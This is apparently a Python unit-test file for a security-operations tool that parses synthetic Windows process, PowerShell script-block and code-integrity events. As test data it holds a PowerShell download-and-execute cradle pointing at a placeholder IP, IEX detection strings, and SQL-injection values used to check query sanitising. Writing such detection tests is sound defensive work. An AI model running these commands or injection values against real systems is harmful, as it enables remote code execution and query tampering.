"""Synthetic process, PowerShell, integrity and truncation regressions for offense evidence."""

import base64
import unittest

from soc_bridge import process_chain
from soc_bridge.aql_search import MAX_FIELD_CHARS
from soc_bridge.focused_queries import host_predicate, parent_lookup
from soc_bridge.aql_fields import FieldCatalog, plan_select, EVENT_COLUMNS
from soc_bridge.offense_evidence import Budget, collect_offense_evidence
from soc_bridge.windows_events import extract

from synthetic_lab import (G_CHILD, G_OTHER, G_PARENT, G_PS, HOST, IP, Lab, NOW, SHA, integrity_text,
                           offense, row, script_block_xml, sysmon)

PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
NOISE = [row("EventID=4624 Computer=" + HOST + " An account was successfully logged on", i * 1000)
         for i in range(4)]


def record(payload, index=0, query="events"):
    parsed = extract({"raw_payload": payload})
    parsed["provenance"] = {"query": query, "search_id": "synthetic-job-0", "result_row_index": index,
                            "starttime_utc": None}
    return parsed


def lab_with(events, script=None, integrity=None, extra=None, **kwargs):
    routes = {"UNIQUECOUNT": ("flows", [{"total_rows": 0, "distinct_destinations": 0}], None),
              "FROM flows WHERE INOFFENSE": ("flows", [], None),
              "FROM events WHERE INOFFENSE": ("events", events, None)}
    if script is not None:
        routes["scriptblock"] = ("events", script, None)
    if integrity is not None:
        routes["code integrity"] = ("events", integrity, None)
    routes.update(extra or {})
    return Lab(routes, **kwargs)


class ProcessCollectionTests(unittest.IsolatedAsyncioTestCase):
    async def test_relevant_process_only_on_last_page_is_found_when_budget_allows(self):
        target = row(sysmon(G_PS, 4321, PS, "powershell.exe", G_PARENT, 1000), 5000)
        lab = lab_with(NOISE + [target])
        evidence = await collect_offense_evidence(lab, offense(), now=NOW, budget=Budget(page_size=2))
        self.assertEqual(evidence["queries"]["events"]["pages"], 3)
        self.assertEqual(len(evidence["processes"]["process_creations"]), 1)
        self.assertEqual(evidence["processes"]["process_creations"][0]["provenance"]["result_row_index"], 4)

    async def test_first_pages_without_process_keep_coverage_incomplete(self):
        target = row(sysmon(G_PS, 4321, PS, "powershell.exe", G_PARENT, 1000), 5000)
        evidence = await collect_offense_evidence(lab_with(NOISE + [target]), offense(), now=NOW,
                                                  budget=Budget(page_size=2, max_pages=2))
        events = evidence["queries"]["events"]
        self.assertEqual(evidence["processes"]["process_creations"], [])
        self.assertEqual(events["outcome"], "partial")
        self.assertFalse(events["result_set_complete"])
        self.assertEqual(events["continuation"]["action"], "fetch_next_page")
        self.assertEqual(events["continuation"]["cursor"], 4)
        self.assertIn("query:events", [g["id"] for g in evidence["gap_details"]])

    async def test_powershell_without_arguments_and_later_4104_content(self):
        creation = row(sysmon(G_PS, 4321, PS, "powershell.exe", G_PARENT, 1000))
        block = row(script_block_xml("IEX (New-Object Net.WebClient).DownloadString(&apos;http://198.51.100.7/a&apos;)"), 30000)
        evidence = await collect_offense_evidence(lab_with([creation], script=[block]), offense(), now=NOW)
        process = evidence["processes"]["powershell_processes"][0]
        self.assertTrue(process["powershell"]["no_arguments"])
        self.assertEqual(process["powershell"]["iex_tokens_in_command_line"], 0)
        self.assertIn("does not exclude IEX", process["powershell"]["note"])
        script = evidence["processes"]["script_blocks"][0]
        self.assertEqual(script["kind"], "powershell_session_content")
        self.assertEqual(script["iex_tokens"], 1)
        self.assertEqual(script["provenance"]["query"], "script_blocks")
        self.assertEqual(script["candidate_processes"][0]["guid"], process_chain.guid(G_PS))
        self.assertIn("candidate", script["candidate_processes"][0]["basis"])
        self.assertIn("PowerShell process creation", evidence["focused_queries"]["script_blocks"]["trigger"])

    async def test_no_4104_returned_is_a_gap_without_forwarding_inference(self):
        creation = row(sysmon(G_PS, 4321, PS, "powershell.exe", G_PARENT, 1000))
        evidence = await collect_offense_evidence(lab_with([creation], script=[]), offense(), now=NOW)
        gap = next(g for g in evidence["gap_details"] if g["id"] == "powershell:script-blocks")
        self.assertEqual(gap["state"], "not_returned_in_filters_window")
        self.assertIn("does not show which applies", gap["next_action"])
        self.assertEqual(gap["relevance"]["blocks"], ["powershell_content_claims"])
        self.assertIn("no 4104 result shows logging or forwarding was disabled",
                      evidence["assessment"]["prohibited_inferences"])

    async def test_5038_for_a_different_file_stays_separate(self):
        creation = row(sysmon(G_PS, 4321, PS, "powershell.exe", G_PARENT, 1000))
        other = row(integrity_text("\\Device\\HarddiskVolume3\\Program Files\\ExampleVendor\\agent.dll"), 60000)
        same = row(integrity_text("\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"), 61000)
        evidence = await collect_offense_evidence(lab_with([creation], integrity=[other, same]), offense(), now=NOW)
        events = evidence["integrity"]["integrity_events"]
        self.assertIn("separate finding", events[0]["relationship_to_process_chain"])
        self.assertIn("does not establish", events[0]["interpretation"])
        self.assertEqual(events[1]["relationship_to_process_chain"][0]["status"], "candidate")

    async def test_truncation_survives_parsing_and_enrichment(self):
        payload = sysmon(G_CHILD, 77, "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c echo " + "A" * (MAX_FIELD_CHARS + 500))
        evidence = await collect_offense_evidence(lab_with([row(payload)]), offense(), now=NOW)
        events = evidence["queries"]["events"]
        self.assertEqual(events["truncated_rows"], {"0": ["raw_payload"]})
        process = evidence["processes"]["process_creations"][0]
        # The bridge cut lands inside CommandLine, so it is the last parsed label and flagged.
        self.assertTrue(process["fields"]["CommandLine"]["possibly_truncated"])
        self.assertTrue(process["fields"]["CommandLine"]["preview_truncated"])
        self.assertNotIn("User", process["fields"])  # label lost after the cut: stays absent
        self.assertTrue(any(g["id"] == "truncation:events" for g in evidence["gap_details"]))

    async def test_parent_lookup_uses_validated_guid_and_stops_at_window_gap(self):
        child = row(sysmon(G_PS, 4321, PS, "powershell.exe", G_PARENT, 1000))
        evil = row(sysmon(G_CHILD, 99, "C:\\x.exe", "x.exe", "{x' OR '1'='1}", 98), 1000)
        lab = lab_with([child, evil])
        evidence = await collect_offense_evidence(lab, offense(), now=NOW)
        lookups = [q for q in lab.queries if process_chain.guid(G_PARENT) in q]
        self.assertEqual(len(lookups), 1)
        self.assertFalse(any("OR '1'='1" in q for q in lab.queries))
        gap = next(g for g in evidence["gap_details"] if g["id"].startswith("parent:"))
        self.assertEqual(gap["state"], "not_found_in_window")


class ProcessChainTests(unittest.TestCase):
    def test_guid_links_and_pid_reuse_are_not_confused(self):
        parent = record(sysmon(G_PARENT, 100, "C:\\Windows\\explorer.exe", "explorer.exe"), 0)
        reused = record(sysmon(G_OTHER, 100, "C:\\Windows\\notepad.exe", "notepad.exe"), 1)
        child = record(sysmon(G_PS, 200, PS, "powershell.exe -NoProfile", G_PARENT, 100), 2)
        pid_only = record(sysmon(G_CHILD, 300, "C:\\Windows\\System32\\cmd.exe", "cmd.exe", None, 100), 3)
        analysis = process_chain.analyze([parent, reused, child, pid_only])
        self.assertEqual([(l["child_guid"], l["parent_guid"]) for l in analysis["links"]],
                         [(process_chain.guid(G_PS), process_chain.guid(G_PARENT))])
        self.assertEqual(analysis["pid_reuse"][0]["pid"], "100")
        self.assertEqual(len(analysis["pid_reuse"][0]["distinct_guids"]), 2)
        self.assertEqual(analysis["unlinked_references"][0]["status"], "not_linked")
        self.assertIn(process_chain.guid(G_PARENT), analysis["chains"][0]["child_to_ancestor_guids"])

    def test_other_host_or_injected_label_never_links(self):
        parent = record(sysmon(G_PARENT, 100, "C:\\Windows\\explorer.exe", "explorer.exe", host="ws-demo-02.example.test"))
        child = record(sysmon(G_PS, 200, PS, "powershell.exe", G_PARENT, 100))
        # The command line carries a forged label before the real ParentProcessGuid field.
        injected = record(sysmon(G_CHILD, 300, PS, f"powershell.exe ParentProcessGuid: {G_PARENT}", G_OTHER, 5), 2)
        analysis = process_chain.analyze([parent, child, injected])
        self.assertEqual(analysis["links"], [])
        self.assertEqual(analysis["unlinked_references"][0]["status"], "candidate")
        self.assertTrue(injected["fields"]["ParentProcessGuid"]["ambiguous"])

    def test_cycles_are_bounded(self):
        a = record(sysmon(G_PARENT, 1, "C:\\a.exe", "a.exe", G_PS, 2))
        b = record(sysmon(G_PS, 2, "C:\\b.exe", "b.exe", G_PARENT, 1), 1)
        analysis = process_chain.analyze([a, b])  # must terminate
        self.assertEqual(len(analysis["links"]), 2)
        self.assertEqual(analysis["cycles_detected"], 2)
        self.assertEqual(analysis["chains"], [])  # a pure loop has no leaf to report as a chain

    def test_argument_file_is_not_execution(self):
        item = record(sysmon(G_PS, 1, "C:\\Program Files\\Tool\\scan.exe",
                             '"C:\\Program Files\\Tool\\scan.exe" /target "C:\\Users\\demo.user\\report.docx"'))
        process = process_chain.analyze([item])["process_creations"][0]
        argument = process["file_arguments"][0]
        self.assertEqual(argument["relationship"], "argument_reference")
        self.assertIn("not established", argument["note"])
        self.assertTrue(argument["path_as_reported"].endswith("report.docx"))

    def test_iex_is_distinct_from_iexplore(self):
        for text in ("iex $x", "IEX(New-Object Net.WebClient)", "$a | iex", "Invoke-Expression $c"):
            self.assertTrue(process_chain.IEX.search(text), text)
        for text in ("C:\\Program Files\\Internet Explorer\\iexplore.exe", "start iexplore.exe", "file.iex", "iexample"):
            self.assertFalse(process_chain.IEX.search(text), text)

    def test_encoded_command_is_data_and_completeness_unproven(self):
        blob = base64.b64encode("Write-Output synthetic; iex $payload".encode("utf-16le")).decode()
        for flag in ("-enc", "-e", "-EncodedCommand", "/ec"):
            decoded = process_chain.decode_encoded(f"powershell.exe {flag} {blob}")[0]
            self.assertIn("synthetic", decoded["decoded_utf16le"])
            self.assertEqual(decoded["iex_tokens"], 1)
            self.assertFalse(decoded["executed_by_bridge"])
            self.assertIn("Not proven", decoded["completeness"])
        failed = process_chain.decode_encoded("powershell.exe -enc AAAAAAAAA")[0]
        self.assertIsNone(failed["decoded_utf16le"])
        self.assertEqual(failed["base64_observed"], "AAAAAAAAA")

    def test_repeated_and_abbreviated_hashes_prove_nothing(self):
        from soc_bridge import integrity_evidence
        first = record(sysmon(G_PARENT, 1, "C:\\a.exe", "a.exe", hashes=f"SHA256={SHA}"))
        second = record(sysmon(G_PS, 2, "C:\\b.exe", "b.exe", hashes=f"SHA256={SHA},MD5=ABCD"), 1)
        analysis = process_chain.analyze([first, second])
        result = integrity_evidence.analyze([], analysis["process_creations"])
        self.assertEqual(result["repeated_hashes"][0]["records"], 2)
        self.assertIn("does not prove integrity", result["repeated_hashes"][0]["note"])
        self.assertEqual(result["non_comparable_hashes"][0]["algorithm"], "MD5")

    def test_untrusted_values_never_reach_aql(self):
        plan = plan_select(EVENT_COLUMNS, FieldCatalog("events"))
        self.assertIsInstance(parent_lookup(plan, "LAST 24 HOURS", 1, 2, "{x' OR '1'='1}"), str)
        predicate = host_predicate(IP, ["evil'%host", "ok-host.example.test", "a_b"])
        self.assertIn("ok-host.example.test", predicate)
        self.assertNotIn("evil", predicate)
        self.assertNotIn("a_b", predicate)
        catalog = FieldCatalog.from_metadata("events", {"fields": [{"name": 'Bad" OR 1=1'}, {"name": "ProcessGuid"}]})
        self.assertEqual(catalog.ignored_unsafe_names, 1)
        self.assertEqual(list(catalog.names.values()), ["ProcessGuid"])


if __name__ == "__main__":
    unittest.main()
